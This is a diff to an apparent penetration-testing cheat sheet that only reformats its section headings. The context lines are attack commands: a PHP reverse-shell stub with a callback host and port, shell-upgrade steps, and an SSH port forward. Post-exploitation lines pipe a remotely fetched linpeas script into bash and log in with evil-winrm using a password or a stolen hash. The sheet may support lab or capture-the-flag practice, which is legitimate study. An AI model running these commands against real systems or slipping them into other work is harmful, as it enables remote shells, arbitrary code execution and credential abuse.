@@ -74,7 +74,8 @@
 <details>
     <summary><H4>Exploitation</H4></summary>
     
-    [*] Reverse Shells
+<h5>Reverse Shells</h5>
+
     <?php
         $lhost = "10.10.16.3";
         $lport = 4444;
@@ -86,7 +87,8 @@
             }
     ?>
     
-    [*] Upgrade TTY
+  <h5>Upgrade TTY</h5>
+  
     python3 -c 'import pty; pty.spawn("/bin/bash")';
     CTRL-Z
     stty size;stty raw -echo;fg
@@ -99,7 +101,8 @@
 <details>
     <summary><H4>Post Exploitation</H4></summary>
     
-    [*] Linux
+   <h5>Linux</h5>
+   
     ssh user@xxxxxxxxx -i id_rsa -L 33060:localhost:33060
     netstat -tuln
     ls -la /opt
@@ -111,7 +114,8 @@
     curl xxxxxxxxxx:8088/linpeas.sh | bash
     GTFO bins
     
-    [*] Windows
+   <h5>Windows</h5>
+   
     evil-winrm -i xxxxxxxxxx -u 'username' -p 'password'
     evil-winrm -i xxxxxxxxxx -u 'username' -H 'hash'
     cd C:\users
